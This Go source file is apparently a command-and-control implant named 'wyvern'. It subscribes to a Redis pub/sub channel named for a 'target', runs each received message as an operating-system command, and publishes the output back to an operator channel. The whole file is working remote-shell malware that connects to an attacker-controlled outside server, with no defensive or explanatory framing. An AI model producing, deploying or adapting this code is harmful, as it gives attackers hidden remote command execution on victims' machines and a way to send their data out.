package main

import (
    "context"
    "github.com/go-redis/redis/v8"
    "fmt"
	"time"
	"os/exec"
	"strings"
)

var ctx = context.Background()



func Client() {

	nameTarget := "" // Specify the name of your target

    rdb := redis.NewClient(&redis.Options{
        Addr:     "",  // address redis server like [host]:[port]
        Password: "", // password redis server
        DB:       0, 
    })

	nameCommand := fmt.Sprintf("wyvern-%s-command", nameTarget) 
	pubsub := rdb.Subscribe(ctx, nameCommand)

	defer pubsub.Close()

	for {
		msg, err := pubsub.ReceiveMessage(ctx)
		if err != nil {
			time.Sleep(1 * time.Second)
		} else {
			var data []string
			if (strings.Contains(msg.Payload , "@#@") ) {
				data = strings.Split(msg.Payload, "@#@")
				for i := range data {
					data[i] = strings.TrimSpace(data[i])
				  }
			} else {
				data = strings.Split(msg.Payload, " ")
			}

			if (len(data) > 1) {
				if data[0] == "go" {
					data := data[1:]
					go RunCommand(data)
					rdb.Publish(ctx, "wyvern-response", "ok!").Err()
				}else {

					out, err := exec.Command(data[0], data[1:]...).Output()
					if err != nil {
						rdb.Publish(ctx, "wyvern-response", fmt.Sprintf("Error[%v]", err) ).Err()
					}else {
						rdb.Publish(ctx, "wyvern-response", string(out)).Err()
					}
				}
			} else {
				
				out, err := exec.Command(data[0]).Output()
				if err != nil {
					rdb.Publish(ctx, "wyvern-response", fmt.Sprintf("Error[%v]", err) ).Err()
				}else {
					rdb.Publish(ctx, "wyvern-response", string(out)).Err()
				}
			} 
		}
	
	}

}

func RunCommand(data []string) {
	exec.Command(data[0], data[1:]...).Output()
}

func main() {
    Client()
}


